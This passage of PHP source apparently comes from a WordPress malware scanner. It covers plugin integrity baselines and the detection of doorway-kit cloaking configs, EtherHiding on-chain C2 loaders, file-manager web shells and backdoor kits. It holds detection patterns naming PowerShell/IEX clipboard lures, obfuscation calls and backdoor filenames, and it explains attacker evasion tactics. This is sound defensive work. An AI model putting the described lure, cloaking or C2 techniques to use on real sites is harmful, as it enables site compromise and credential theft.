			if ( $slug === '' ) continue;
			// Accept either "my-plugin" or "my-plugin/my-plugin.php".
			if ( strpos( $slug, '/' ) !== false ) {
				$slug = (string) strtok( $slug, '/' );
			}
			if ( preg_match( '/^[a-z0-9][a-z0-9._-]{0,60}$/', $slug ) ) {
				$out[ $slug ] = true;
			}
		}
		return array_keys( $out );
	}

	/**
	 * 1.4.11: integrity for the operator's own plugins.
	 *
	 * Declaring a plugin first-party stops it being reported as lacking a
	 * wordpress.org baseline, which is correct - there is no baseline to be
	 * had for code that was never published there. But silence would be the
	 * wrong trade, because "my own plugin" is a comfortable place for an
	 * attacker to add a file: nobody checks it against anything.
	 *
	 * So a baseline is recorded locally instead. Every PHP file in the plugin
	 * is hashed, the set is reduced to one fingerprint, and it is stored
	 * against the plugin's version. When the version changes the fingerprint
	 * is refreshed silently, because that is an update. When the fingerprint
	 * changes and the version does NOT, something edited the plugin in place -
	 * which is what both a compromise and an undeclared hotfix look like, and
	 * the operator is the only one who can tell those apart.
	 *
	 * @return array<int, array<string, string|bool>>
	 */
	private static function check_first_party_integrity(): array {
		$found = [];
		$slugs = self::first_party_slugs();
		if ( ! $slugs ) {
			return $found;
		}
		$base = defined( 'WP_PLUGIN_DIR' ) ? WP_PLUGIN_DIR : ( WP_CONTENT_DIR . '/plugins' );
		$store = get_option( 'wps_first_party_baseline', [] );
		if ( ! is_array( $store ) ) {
			$store = [];
		}
		$dirty = false;

		foreach ( $slugs as $slug ) {
			$dir = $base . '/' . $slug;
			if ( ! is_dir( $dir ) ) {
				continue; // declared but not installed - not an error
			}

			$parts = [];
			try {
				$iter = new RecursiveIteratorIterator(
					new RecursiveDirectoryIterator( $dir, FilesystemIterator::SKIP_DOTS ),
					RecursiveIteratorIterator::LEAVES_ONLY
				);
				foreach ( $iter as $f ) {
					if ( ! ( $f instanceof SplFileInfo ) || ! $f->isFile() ) continue;
					if ( ! self::is_php_executable( $f ) ) continue;
					if ( ! $f->isReadable() ) continue;
					$rel = str_replace( '\\', '/', substr( $f->getPathname(), strlen( $dir ) + 1 ) );
					$h   = @hash_file( 'sha256', $f->getPathname() );
					if ( $h === false ) continue;
					$parts[ $rel ] = $h;
				}
			} catch ( \Exception $e ) {
				continue;
			}
			if ( ! $parts ) {
				continue;
			}
			ksort( $parts );
			$fingerprint = hash( 'sha256', (string) wp_json_encode( $parts ) );
			$version     = self::plugin_version_for_slug( $dir );

			$prev = isset( $store[ $slug ] ) && is_array( $store[ $slug ] ) ? $store[ $slug ] : null;
			if ( $prev === null || (string) ( $prev['version'] ?? '' ) !== $version ) {
				// First sight, or a genuine version change: (re)baseline quietly.
				$store[ $slug ] = [
					'version'     => $version,
					'fingerprint' => $fingerprint,
					'files'       => count( $parts ),
					'recorded'    => gmdate( 'Y-m-d H:i:s' ) . ' UTC',
				];
				$dirty = true;
				continue;
			}

			if ( (string) ( $prev['fingerprint'] ?? '' ) === $fingerprint ) {
				continue; // unchanged
			}

			$was = (int) ( $prev['files'] ?? 0 );
			$now = count( $parts );
			$delta = $now === $was
				? 'same file count (' . $now . ')'
				: ( $now > $was ? ( $now - $was ) . ' file(s) added' : ( $was - $now ) . ' file(s) removed' );

			$found[] = [
				'severity' => 'high',
				'type'     => 'First-party plugin changed without a version bump',
				'subject'  => $slug . ' ' . ( $version !== '' ? $version : '(no version)' ),
				'path'     => $dir,
				'match'    => $delta . ', baseline recorded ' . (string) ( $prev['recorded'] ?? 'previously' ),
				'action'   => 'You declared ' . $slug . ' as your own plugin, so it is exempt from the wordpress.org checksum report - but its PHP files no longer match the fingerprint recorded when version ' . ( $version !== '' ? $version : 'the current one' ) . ' was first seen, and the version number has not changed. '
					. 'An ordinary update changes both. Changing the files while leaving the version alone is what an edit in place looks like, whether that edit was yours or not. '
					. 'If you edited the plugin directly on this site, that is the explanation and the baseline will follow the next version bump. If you did not, treat it as a planted file: compare the directory against your own copy of ' . $slug . ' and look for anything you did not write. Reported for review; nothing has been changed.',
			];

			$store[ $slug ] = [
				'version'     => $version,
				'fingerprint' => $fingerprint,
				'files'       => $now,
				'recorded'    => gmdate( 'Y-m-d H:i:s' ) . ' UTC',
			];
			$dirty = true;
		}

		if ( $dirty ) {
			update_option( 'wps_first_party_baseline', $store, false );
		}
		return $found;
	}

	/** Read the Version: header from a plugin directory's main file. */
	private static function plugin_version_for_slug( string $dir ): string {
		foreach ( (array) glob( $dir . '/*.php' ) as $file ) {
			$head = @file_get_contents( $file, false, null, 0, 8192 );
			if ( ! is_string( $head ) || stripos( $head, 'Plugin Name:' ) === false ) continue;
			if ( preg_match( '/^[ \t\/*#@]*Version:\s*(.+)$/mi', $head, $m ) ) {
				return trim( $m[1] );
			}
		}
		return '';
	}

	/**
	 * 1.4.48: decide whether one JSON file is a doorway kit's cloaking
	 * configuration, and describe it. Extracted so that the config check and
	 * the kit-directory scorer ask the same question in the same way rather
	 * than growing two answers that drift apart.
	 *
	 * The pre-filter no longer turns on the single literal `panel_kee`. That
	 * was measured against a renamed sample and it is a one-word off switch:
	 * change that key and the whole check goes silent, while the kit keeps
	 * working, because nothing else reads it. Qualifying on THREE of the
	 * catalogued key names instead costs the same (a handful of stripos calls
	 * over a 64 KB head) and cannot be turned off without editing the PHP that
	 * reads those keys.
	 *
	 * Returns [] for anything that is not a cloak config. A multi-megabyte
	 * JSON is never decoded unless the head already qualified.
	 *
	 * @param string $path Absolute path to a .json file.
	 * @return array<string, mixed> Empty when not a cloak config.
	 */
	private static function cloak_config_profile( string $path ): array {
		// 1.4.48: memoised for one scan pass. The kit scorer looks in up to
		// four directories per candidate, and neighbouring candidates overlap,
		// so without this a site's package.json files get read several times
		// each - measured at 4.3x the cost of the check it replaced.
		//
		// Keyed on path, not on content, and that is a deliberate departure
		// from the 1.4.47 cache. There the cached value FEEDS detection, so a
		// stale answer corrupts a finding; here it decides only whether one
		// directory scores a cue, the cache lives for a single pass, and the
		// worst a mid-scan edit can do is move a cue by one scan. Paying a
		// content hash on multi-megabyte blocklists to avoid that would cost
		// more than the problem.
		static $memo = [];
		if ( isset( $memo[ $path ] ) ) {
			return $memo[ $path ];
		}
		if ( count( $memo ) > 512 ) {
			$memo = []; // bounded: a ceiling, not an accumulating store
		}

		$memo[ $path ] = self::cloak_config_profile_uncached( $path );
		return $memo[ $path ];
	}

	/**
	 * @param string $path Absolute path to a .json file.
	 * @return array<string, mixed> Empty when not a cloak config.
	 */
	private static function cloak_config_profile_uncached( string $path ): array {
		if ( ! class_exists( 'WPS_Indicators' ) || ! method_exists( 'WPS_Indicators', 'doorway_cloak_config_keys' ) ) {
			return [];
		}
		$keys = WPS_Indicators::doorway_cloak_config_keys();

		$size = @filesize( $path );
		if ( $size === false || $size < 512 || $size > 33554432 ) return [];

		$head = @file_get_contents( $path, false, null, 0, 65536 );
		if ( $head === false ) return [];

		$hits = 0;
		foreach ( $keys as $k ) {
			if ( stripos( $head, $k ) !== false ) $hits++;
		}
		if ( $hits < 3 ) return [];

		$raw = @file_get_contents( $path );
		if ( $raw === false ) return [];
		$cfg = json_decode( $raw, true );
		if ( ! is_array( $cfg ) ) return [];

		$present = [];
		foreach ( $keys as $k ) {
			if ( array_key_exists( $k, $cfg ) ) $present[] = $k;
		}
		if ( count( $present ) < 4 ) return [];

		// Size the evasion lists: this is what separates a kit from a site's
		// own allow-list configuration.
		$biggest = 0;
		$sized   = [];
		foreach ( [ 'black_ip_array', 'black_userag_array', 'black_org_array', 'black_country_array' ] as $listk ) {
			if ( ! empty( $cfg[ $listk ] ) && is_array( $cfg[ $listk ] ) ) {
				$n       = count( $cfg[ $listk ] );
				$sized[] = $listk . '=' . $n;
				if ( $n > $biggest ) $biggest = $n;
			}
		}
		if ( $biggest < 100 ) return []; // small lists are ordinary configuration

		return [
			'present' => $present,
			'sized'   => $sized,
			'biggest' => $biggest,
			'version' => isset( $cfg['version'] ) ? (string) $cfg['version'] : '',
		];
	}


	/**
	 * 1.4.55: on-chain command-and-control resolution, detected as a technique.
	 *
	 * EtherHiding reads the current C2 address out of a blockchain smart
	 * contract instead of hard-coding it. The operator rotates infrastructure
	 * daily by writing to the contract, without touching the injected code on
	 * any of the compromised sites, and there is no domain to put on a
	 * blocklist.
	 *
	 * WP Perf Shield already carried a list of public RPC hostnames. That list
	 * has a structural limit: the ErrTraffic "Beer" cluster resolves through
	 * Quicknode, which issues a per-customer subdomain, and each affiliate is
	 * assigned its own contract. Neither the host nor the contract can be
	 * enumerated ahead of time, so an unseen affiliate defeats a list-based
	 * match entirely.
	 *
	 * What cannot be varied is the shape: a JSON-RPC read primitive, and a
	 * contract address for it to read from. Both are required here, because
	 * either alone is ordinary — `eth_call` appears in every web3 library, and
	 * a 40-hex string is just a hex string.
	 *
	 * Both together are still not enough. A legitimate web3 plugin does
	 * precisely this, on purpose, in its own directory, and flagging it would
	 * be the kind of false positive that teaches an operator to ignore the
	 * scanner. So a third, independent signal is required: obfuscation, a
	 * ClickFix lure, a known ErrTraffic request path, or a location no
	 * self-declared plugin would choose.
	 *
	 * @return array<int, array<string, mixed>>
	 */
	private static function check_etherhiding_resolver(): array {
		$found = [];

		$rpc_primitives = [ 'eth_call', 'eth_getStorageAt' ];
		$endpoints = method_exists( 'WPS_Indicators', 'errtraffic_endpoint_markers' )
			? WPS_Indicators::errtraffic_endpoint_markers() : [];
		$contracts = method_exists( 'WPS_Indicators', 'etherhiding_contracts' )
			? WPS_Indicators::etherhiding_contracts() : [];

		$roots = array_filter( [
			WP_CONTENT_DIR . '/mu-plugins',
			WP_CONTENT_DIR . '/plugins',
			WP_CONTENT_DIR . '/themes',
			WP_CONTENT_DIR . '/uploads',
		], 'is_dir' );

		$examined = 0;

		foreach ( $roots as $root ) {
			try {
				$it = new RecursiveIteratorIterator(
					new RecursiveDirectoryIterator( $root, FilesystemIterator::SKIP_DOTS ),
					RecursiveIteratorIterator::SELF_FIRST
				);
				foreach ( $it as $file ) {
					if ( ! $file->isFile() ) continue;
					$ext = strtolower( $file->getExtension() );
					if ( $ext !== 'php' && $ext !== 'js' ) continue;

					$path = $file->getPathname();
					if ( class_exists( 'WPS_Utils' ) && WPS_Utils::path_is_inside( $path, WPS_DIR ) ) continue;
					if ( class_exists( 'WPS_Quarantine' ) && WPS_Quarantine::is_quarantine_path( $path ) ) continue;

					$size = @filesize( $path );
					if ( $size === false || $size < 64 || $size > 2097152 ) continue;
					if ( ++$examined > 8000 ) break 2; // bound: this walks the whole tree

					$raw = @file_get_contents( $path );
					if ( $raw === false ) continue;
					$src = class_exists( 'WPS_Utils' ) ? WPS_Utils::normalised( $path, $raw ) : $raw;

					// Signal 1: a JSON-RPC read primitive.
					$primitive = '';
					foreach ( $rpc_primitives as $p ) {
						if ( stripos( $src, $p ) !== false ) { $primitive = $p; break; }
					}
					if ( $primitive === '' ) continue;

					// Signal 2: something for it to read from.
					if ( ! preg_match( '/\b0x[0-9a-fA-F]{40}\b/', $src, $addr ) ) continue;

					// Signal 3: at least one reason this is not a web3 plugin
					// doing its job.
					$why = [];

					foreach ( $contracts as $known ) {
						if ( stripos( $src, $known ) !== false ) {
							$why[] = 'known ErrTraffic contract ' . substr( $known, 0, 10 ) . '...';
						}
					}
					foreach ( $endpoints as $marker ) {
						if ( strpos( $src, $marker ) !== false ) {
							$why[] = "ErrTraffic request marker '" . $marker . "'";
						}
					}

					$lure = 0;
					foreach ( [ 'navigator.clipboard', 'clipboardData', 'powershell', 'Win+R', 'IEX(', 'iex(' ] as $l ) {
						if ( stripos( $src, $l ) !== false ) $lure++;
					}
					if ( $lure >= 2 ) {
						$why[] = 'clipboard/command-execution lure markers';
					}

					$obf = 0;
					foreach ( [ 'atob(', 'base64_decode', 'fromCharCode', '^ 0x', 'charCodeAt' ] as $o ) {
						if ( stripos( $src, $o ) !== false ) $obf++;
					}
					if ( $obf >= 2 ) {
						$why[] = 'encoded/XOR-obfuscated payload handling';
					}

					// Location: somewhere a plugin declaring itself would not sit.
					$rel = str_replace( '\\', '/', $path );
					if ( strpos( $rel, '/mu-plugins/' ) !== false ) {
						$why[] = 'in mu-plugins, which cannot be deactivated from the dashboard';
					} elseif ( strpos( $rel, '/uploads/' ) !== false ) {
						$why[] = 'in the uploads directory';
					} elseif ( strpos( $rel, '/themes/' ) !== false && $ext === 'php' ) {
						$why[] = 'in a theme rather than a plugin of its own';
					}

					if ( ! $why ) continue; // a web3 plugin doing web3 things

					$critical = (bool) preg_grep( '/known ErrTraffic contract|clipboard\/command/', $why );

					$found[] = [
						'type'     => 'On-chain C2 resolution (EtherHiding). '
							. 'This file reads an address from a blockchain contract rather than '
							. 'carrying one, which lets whoever placed it move their server daily '
							. 'without editing anything here. '
							. 'Matched: ' . $primitive . ' + contract ' . substr( $addr[0], 0, 10 ) . '...; '
							. implode( '; ', array_slice( $why, 0, 4 ) ) . '. '
							. 'Remove the file, then treat every administrator credential as exposed.',
						'path'     => $path,
						'subject'  => basename( $path ),
						'severity' => $critical ? 'critical' : 'high',
						'match'    => implode( '; ', array_slice( $why, 0, 4 ) ),
					];
				}
			} catch ( \Exception $e ) {
				WPS_Logger::write( 'etherhiding scan error: ' . $e->getMessage() );
			}
		}

		return $found;
	}

	private static function check_doorway_cloak_config(): array {
		$found = [];
		if ( ! class_exists( 'WPS_Indicators' ) || ! method_exists( 'WPS_Indicators', 'doorway_cloak_config_keys' ) ) {
			return $found;
		}
		$roots = [];
		if ( defined( 'WP_CONTENT_DIR' ) ) $roots[] = WP_CONTENT_DIR;
		if ( defined( 'ABSPATH' ) )        $roots[] = rtrim( ABSPATH, '/\\' );

		$self_dir = defined( 'WPS_DIR' ) ? ( realpath( WPS_DIR ) ?: '' ) : '';
		$scanned  = 0;
		$seen     = [];

		foreach ( array_unique( $roots ) as $root ) {
			if ( ! is_dir( $root ) ) continue;
			try {
				$iter = new RecursiveIteratorIterator(
					new RecursiveDirectoryIterator( $root, FilesystemIterator::SKIP_DOTS ),
					RecursiveIteratorIterator::LEAVES_ONLY
				);
				foreach ( $iter as $f ) {
					if ( $scanned++ > self::REDROP_MAX_SCAN_FILES ) break;
					if ( ! ( $f instanceof SplFileInfo ) || ! $f->isFile() ) continue;
					if ( strtolower( $f->getExtension() ) !== 'json' ) continue;
					if ( $f->getSize() < 512 ) continue;          // real cloak configs are never tiny
					if ( $f->getSize() > 33554432 ) continue;     // 32 MiB ceiling

					$path = $f->getPathname();
					$real = realpath( $path );
					if ( $self_dir !== '' && $real && ( $real === $self_dir || WPS_Utils::path_is_inside( $real, WPS_DIR ) ) ) continue;
					if ( class_exists( 'WPS_Quarantine' ) && WPS_Quarantine::is_quarantine_path( $path ) ) continue;
					if ( isset( $seen[ (string) $real ] ) ) continue;

					$profile = self::cloak_config_profile( $path );
					if ( ! $profile ) continue;

					$present = $profile['present'];
					$sized   = $profile['sized'];

					$seen[ (string) $real ] = true;
					$kit_root = dirname( dirname( $path ) ); // <kit>/config/settings.json -> <kit>
					$version  = $profile['version'];

					$found[] = [
						'severity' => 'critical',
						'type'     => 'Doorway kit cloaking configuration' . ( $version !== '' ? ' (kit v' . substr( $version, 0, 16 ) . ')' : '' ),
						'subject'  => basename( dirname( $path ) ) . '/' . basename( $path ),
						'path'     => $path,
						'match'    => implode( ', ', $present ) . ( $sized ? ' | ' . implode( ', ', $sized ) : '' ),
						'action'   => 'This file is the control configuration of a cloaked doorway-spam kit: it holds the allow and deny lists that decide which visitors are shown spam and which are shown a clean page. The blocklists here ('
							. implode( ', ', $sized ) . ') exist to hide the spam from search-engine crawlers, security scanners, and hosting providers. The kit directory is very likely "'
							. basename( $kit_root ) . '" - inspect it and remove the whole kit, then hunt for the dropper that placed it, because these kits are re-planted. Reported for review rather than auto-deleted: deleting a configuration file alone leaves the kit running.',
					];
				}
			} catch ( \Exception $e ) {
				WPS_Logger::write( 'cloak-config scan error: ' . $e->getMessage() );
			}
		}

		return $found;
	}

	/**
	 * 1.4.1: detect a browser-based file manager (Tiny File Manager shape)
	 * used as a web shell. Confirmed blind spot: a 226 KiB file manager sat
	 * inside a live kit sample and the generic web-shell check saw nothing,
	 * because the file uses no eval, no base64 payload, and no obfuscation -
	 * it is simply a complete, readable filesystem-control application, which
	 * is precisely what makes it a capable shell.
	 *
	 * Identified by a cluster of its defining constants, never by one. The
	 * finding's severity is driven by LOCATION: inside uploads, a kit folder,
	 * mu-plugins, or the web root it is treated as a shell; elsewhere it is
	 * reported as a review item, since operators do legitimately install file
	 * managers. Never auto-deleted - that judgement belongs to the operator.
	 *
	 * @return array<int, array<string, string|bool>>
	 */
	private static function check_file_manager_shell(): array {
		$found = [];
		if ( ! class_exists( 'WPS_Indicators' ) || ! method_exists( 'WPS_Indicators', 'file_manager_shell_markers' ) ) {
			return $found;
		}
		$markers  = WPS_Indicators::file_manager_shell_markers();
		$self_dir = defined( 'WPS_DIR' ) ? ( realpath( WPS_DIR ) ?: '' ) : '';
		$scanned  = 0;
		// WP_CONTENT_DIR normally lives inside ABSPATH, so walking both roots
		// visits the same file twice; dedupe on realpath.
		$seen     = [];

		$roots = [];
		if ( defined( 'WP_CONTENT_DIR' ) ) $roots[] = WP_CONTENT_DIR;
		if ( defined( 'ABSPATH' ) )        $roots[] = rtrim( ABSPATH, '/\\' );

		$hot = [];
		if ( defined( 'WP_CONTENT_DIR' ) ) {
			$hot[] = strtolower( str_replace( '\\', '/', WP_CONTENT_DIR . '/uploads' ) );
			$hot[] = strtolower( str_replace( '\\', '/', WP_CONTENT_DIR . '/cache' ) );
		}
		if ( defined( 'WPMU_PLUGIN_DIR' ) ) {
			$hot[] = strtolower( str_replace( '\\', '/', WPMU_PLUGIN_DIR ) );
		}

		foreach ( array_unique( $roots ) as $root ) {
			if ( ! is_dir( $root ) ) continue;
			try {
				$iter = new RecursiveIteratorIterator(
					new RecursiveDirectoryIterator( $root, FilesystemIterator::SKIP_DOTS ),
					RecursiveIteratorIterator::LEAVES_ONLY
				);
				foreach ( $iter as $f ) {
					if ( $scanned++ > self::REDROP_MAX_SCAN_FILES ) break;
					if ( ! ( $f instanceof SplFileInfo ) ) continue;
					if ( ! self::is_php_executable( $f ) || ! $f->isReadable() ) continue;
					// A full file manager is a large single file; skip the long tail.
					if ( $f->getSize() < 20480 || $f->getSize() > 4194304 ) continue;

					$path = $f->getPathname();
					$real = realpath( $path );
					if ( $self_dir !== '' && $real && ( $real === $self_dir || WPS_Utils::path_is_inside( $real, WPS_DIR ) ) ) continue;
					if ( class_exists( 'WPS_Quarantine' ) && WPS_Quarantine::is_quarantine_path( $path ) ) continue;
					if ( isset( $seen[ (string) $real ] ) ) continue;
					$seen[ (string) $real ] = true;

					$contents = @file_get_contents( $path );
					if ( $contents === false || $contents === '' ) continue;
					if ( self::is_whitelisted( $contents ) ) continue;

					$hits = [];
					foreach ( $markers as $m ) {
						if ( strpos( $contents, $m ) !== false ) $hits[] = $m;
					}
					if ( count( $hits ) < 4 ) continue; // cluster, never a single constant

					$norm    = strtolower( str_replace( '\\', '/', (string) ( $real ?: $path ) ) );
					$in_hot  = false;
					foreach ( $hot as $h ) {
						if ( $h !== '' && strpos( $norm, $h ) === 0 ) { $in_hot = true; break; }
					}
					// A file manager sitting beside kit components is equally damning.
					$siblings   = (array) @scandir( dirname( $path ) );
					$kit_beside = false;
					foreach ( $siblings as $sib ) {
						if ( preg_match( '/^(backdor[._]|panel_[0-9a-f]{6,}\.php$)/i', (string) $sib ) ) { $kit_beside = true; break; }
					}

					$where = $in_hot ? 'a directory that never contains administrative tools' : 'the site tree';
					$found[] = [
						'severity' => ( $in_hot || $kit_beside ) ? 'critical' : 'high',
						'type'     => 'Browser file-manager web shell'
							. ( $kit_beside ? ' (co-located with doorway kit components)' : ( $in_hot ? ' in an upload/cache path' : ' (review location)' ) ),
						'subject'  => basename( $path ),
						'path'     => $path,
						'match'    => implode( ', ', array_slice( $hits, 0, 6 ) ),
						'action'   => 'This file is a complete browser-based file manager: it can browse, edit, upload, chmod, and unpack archives anywhere it has permission, which makes it a full web shell whether or not it was installed maliciously. It was found in ' . $where . '. '
							. ( $kit_beside ? 'It sits alongside doorway-kit components, so treat it as part of that kit and remove the whole directory. ' : '' )
							. 'If you did not deliberately install a file manager here, delete it and rotate every credential the site uses. Reported for review rather than auto-deleted, because a file manager can be a legitimate tool in the hands of its owner.',
					];
				}
			} catch ( \Exception $e ) {
				WPS_Logger::write( 'file-manager scan error: ' . $e->getMessage() );
			}
		}

		return $found;
	}

	private static function check_doorway_backdoor_kit(): array {
		$found = [];

		$roots = [];
		if ( defined( 'WP_PLUGIN_DIR' ) )   $roots[] = WP_PLUGIN_DIR;
		if ( defined( 'WPMU_PLUGIN_DIR' ) ) $roots[] = WPMU_PLUGIN_DIR;
		if ( defined( 'WP_CONTENT_DIR' ) ) {
			$roots[] = WP_CONTENT_DIR;
			$roots[] = WP_CONTENT_DIR . '/themes';
			$roots[] = WP_CONTENT_DIR . '/uploads';
		}
		if ( defined( 'ABSPATH' ) )         $roots[] = rtrim( ABSPATH, '/\\' );

		$protected = array_values( array_filter( array_map(
			static function ( $p ) { return $p ? rtrim( (string) realpath( $p ), '/\\' ) : ''; },
			[
				defined( 'ABSPATH' ) ? ABSPATH : null,
				defined( 'WP_CONTENT_DIR' ) ? WP_CONTENT_DIR : null,
				defined( 'WP_PLUGIN_DIR' ) ? WP_PLUGIN_DIR : null,
				defined( 'WPMU_PLUGIN_DIR' ) ? WPMU_PLUGIN_DIR : null,
				defined( 'WP_CONTENT_DIR' ) ? WP_CONTENT_DIR . '/themes' : null,
				defined( 'WP_CONTENT_DIR' ) ? WP_CONTENT_DIR . '/uploads' : null,
				defined( 'WPS_DIR' ) ? WPS_DIR : null,
			]
		) ) );

		$seen_kit = [];
		$scanned  = 0;

		foreach ( array_unique( $roots ) as $root ) {
			if ( ! is_dir( $root ) ) continue;
			try {
				$dir_iter = new RecursiveIteratorIterator(
					new RecursiveDirectoryIterator( $root, FilesystemIterator::SKIP_DOTS ),
					RecursiveIteratorIterator::SELF_FIRST
				);
				$dir_iter->setMaxDepth( 6 );
				foreach ( $dir_iter as $entry ) {
					if ( $scanned++ > ( self::REDROP_MAX_SCAN_FILES * 4 ) ) break;
					if ( ! ( $entry instanceof SplFileInfo ) || ! $entry->isDir() ) continue;
					// 1.4.1: previously this required a directory literally named
					// 'core', and renaming it defeated detection outright (confirmed
					// against a live sample). Any directory is now a candidate; the
					// cue score below is what decides, so the kit is identified by
					// its structure rather than by a name the operator controls.
					// 'core' still scores as a corroborating tell.
					$dirname = $entry->getFilename();
					if ( $dirname === 'node_modules' || $dirname === 'vendor' || $dirname[0] === '.' ) continue;

					$core     = $entry->getPathname();
					if ( class_exists( 'WPS_Quarantine' ) && WPS_Quarantine::is_quarantine_path( $core ) ) continue; // 1.3.94: skip the store
					$kit_root = dirname( $core );
					$kit_real = realpath( $kit_root );
					if ( ! $kit_real || isset( $seen_kit[ $kit_real ] ) ) continue;

					$cues = self::doorway_kit_cue_score( $core );
					if ( $cues['score'] < 3 ) continue;

					// 1.4.48: when a cloaking config was located, it is the
					// better locator of the kit root - it names the directory
					// the kit was unpacked into, rather than whatever happens
					// to be the parent of the sub-directory that scored.
					if ( ! empty( $cues['config']['kit_root'] ) ) {
						$kit_root = $cues['config']['kit_root'];
						$kit_real = realpath( $kit_root ) ?: $kit_real;
						if ( isset( $seen_kit[ $kit_real ] ) ) continue;
					}
					$seen_kit[ $kit_real ] = true;

					// Recurrence tracking. core.php is byte-identical across re-drops
					// (only the folder name and the hex-suffixed filenames randomise),
					// so its hash is a stable fingerprint. Count distinct folder names
					// seen for the same fingerprint: a fresh random name for a kit we
					// have already deleted is a genuine re-drop, which means an active
					// re-dropper is re-planting it from outside the kit folder.
					$redrop_count = 0;
					$first_seen   = 0;
					// 1.4.48: the fingerprint used to be `core.php` by name, so
					// renaming that one file also cost the re-drop history -
					// which is the record that proves a kit is being re-planted
					// rather than merely present. Fall back to whichever file
					// was identified as the redirector, since a kit that has no
					// engine has nothing to fingerprint.
					$fp = @hash_file( 'sha256', $core . DIRECTORY_SEPARATOR . 'core.php' );
					if ( ! $fp && ! empty( $cues['reader']['path'] ) ) {
						$fp = @hash_file( 'sha256', $cues['reader']['path'] );
					}
					if ( $fp ) {
						$hist = get_option( 'wps_doorway_kit_history', [] );
						if ( ! is_array( $hist ) ) $hist = [];
						$rec  = isset( $hist[ $fp ] ) && is_array( $hist[ $fp ] )
							? $hist[ $fp ]
							: [ 'first_seen' => time(), 'names' => [] ];
						$name = basename( $kit_root );
						if ( ! in_array( $name, $rec['names'], true ) ) {
							$rec['names'][] = $name;
							if ( count( $rec['names'] ) > 50 ) {
								$rec['names'] = array_slice( $rec['names'], -50 );
							}
						}
						$rec['last_seen'] = time();
						$rec['last_name'] = $name;
						$hist[ $fp ]      = $rec;
						if ( count( $hist ) > 20 ) {
							uasort( $hist, static function ( $a, $b ) {
								return ( $a['first_seen'] ?? 0 ) <=> ( $b['first_seen'] ?? 0 );
							} );
							$hist = array_slice( $hist, -20, null, true );
						}
						update_option( 'wps_doorway_kit_history', $hist, false );
						$redrop_count = count( $rec['names'] );
						$first_seen   = (int) ( $rec['first_seen'] ?? 0 );
					}

					$is_protected = in_array( $kit_real, $protected, true );
					if ( ! $is_protected ) {
						foreach ( $protected as $p ) {
							if ( $p !== '' && WPS_Utils::path_is_inside( $p, $kit_real ) ) { $is_protected = true; break; }
						}
					}

					$finding = [
						'severity' => 'critical',
						'type'     => 'Doorway-spam / backdoor panel kit (annealing/resweep family)',
						'subject'  => basename( $kit_root ),
						'path'     => $kit_root,
						'match'    => implode( ', ', $cues['tells'] ),
					];
					if ( $is_protected ) {
						$finding['action']      = 'Backdoor kit detected, but its directory resolves to a protected WordPress path, so it is not auto-deleted. Remove the kit files manually.';
						$finding['auto_delete'] = false;
					} else {
						$finding['action']      = 'Delete this entire directory. It is a self-contained PHP backdoor and doorway-spam kit (file-manager web shell, admin panel, IP cloaking, link injection). Also search the webroot for renamed copies of it.';
						$finding['auto_delete'] = true;
						$finding['delete_path'] = $kit_root;
					}

					// Re-drop overlay: the kit removes cleanly each scan, so its return
					// under a new random name points at a re-dropper, not at a missed
					// file. Say so, and direct the hunt to the persistence vectors.
					if ( $redrop_count >= 2 ) {
						$finding['type']         = 'Doorway/backdoor kit RE-DROPPED ' . $redrop_count . 'x (annealing/resweep family)  active re-dropper present';
						$finding['redrop_count'] = $redrop_count;
						$finding['action']       = 'This kit has now been detected ' . $redrop_count . ' times under different random names'
							. ( $first_seen ? ' since ' . gmdate( 'Y-m-d H:i:s', $first_seen ) . ' UTC' : '' )
							. '. The scanner removes it on every scan, yet it keeps coming back  so an active re-dropper outside the kit folder is re-planting it, and deleting the kit again will not break the cycle. Find the dropper: check wp-cron and any system crontab, the mu-plugins directory, wp-config.php and auto_prepend_file injection, and any other co-resident web shell (this operator runs a whole toolkit, not a single file). ' . $finding['action'];
					}

					$found[] = $finding;
				}
			} catch ( \Exception $e ) {
				WPS_Logger::write( 'doorway-kit scan error: ' . $e->getMessage() );
			}
		}

		// 1.4.48: one kit, one finding.
		//
		// A kit's own sub-directories can each score on their own - `include/`
		// holds the backdoor file, `config/` holds the cloaking config - and
		// each then reports the directory above it as a separate kit. The
		// operator gets three criticals for one intrusion, nested inside each
		// other, and no clear instruction about which directory to remove.
		// Keep only the outermost root; deleting it takes the rest with it.
		if ( count( $found ) > 1 ) {
			$outermost = [];
			foreach ( $found as $i => $f ) {
				$nested = false;
				foreach ( $found as $j => $g ) {
					if ( $i === $j ) continue;
					$fp = (string) ( $f['path'] ?? '' );
					$gp = (string) ( $g['path'] ?? '' );
					if ( $fp === '' || $gp === '' || $fp === $gp ) continue;
					if ( WPS_Utils::path_is_inside( $fp, $gp ) ) { $nested = true; break; }
				}
				if ( ! $nested ) $outermost[] = $f;
			}
			$found = $outermost;
		}

		return $found;
	}

	/**
	 * Score the structural tells of the doorway/backdoor kit inside a candidate
	 * `core/` directory. The misspelled "backdor" backdoor file is near-unique to
	 * this family and counts double.
	 *
	 * @return array{score:int, tells:array<int,string>}
	 */
	private static function doorway_kit_cue_score( string $core ): array {
		$score = 0;
		$tells = [];
		$names = (array) @scandir( $core );
		if ( ! $names ) return [ 'score' => 0, 'tells' => [] ];

		$has_backdor = false;
		foreach ( $names as $name ) {
			if ( preg_match( '/^backdor[._]/i', $name ) ) { $has_backdor = true; break; }
		}
		if ( ! $has_backdor && is_dir( $core . '/include' ) ) {
			foreach ( (array) @scandir( $core . '/include' ) as $name ) {
				if ( preg_match( '/^backdor[._]/i', $name ) ) { $has_backdor = true; break; }
			}
		}
		if ( $has_backdor ) { $score += 2; $tells[] = 'backdor* file (misspelled backdoor)'; }

		$has_panel = false;
		$has_fm    = false;
		foreach ( $names as $name ) {
			if ( preg_match( '/^panel_[0-9a-f]{6,}\.php$/i', $name ) )       $has_panel = true;
			if ( preg_match( '/^filemanager_[0-9a-f]{6,}\.php$/i', $name ) )  $has_fm = true;
		}
		if ( $has_panel ) { $score++; $tells[] = 'panel_<hex>.php'; }
		if ( $has_fm )    { $score++; $tells[] = 'filemanager_<hex>.php'; }

		$modules = is_dir( $core . '/modules' ) ? (array) @scandir( $core . '/modules' ) : [];
		if ( in_array( 'ipManager.php', $modules, true )
			&& in_array( 'linkManager.php', $modules, true )
			&& in_array( 'settingsManager.php', $modules, true ) ) {
			$score++;
			$tells[] = 'ipManager/linkManager/settingsManager module set';
		}

		if ( basename( $core ) === 'core' && $score > 0 ) {
			$score++;
			$tells[] = "directory named 'core'";
		}

		// 1.4.48: everything above is a name somebody chose.
		//
		// Measured against this kit renamed - directory `core` to `lib`,
		// `backdor_<hex>.php`, `panel_<hex>.php` and `filemanager_<hex>.php`
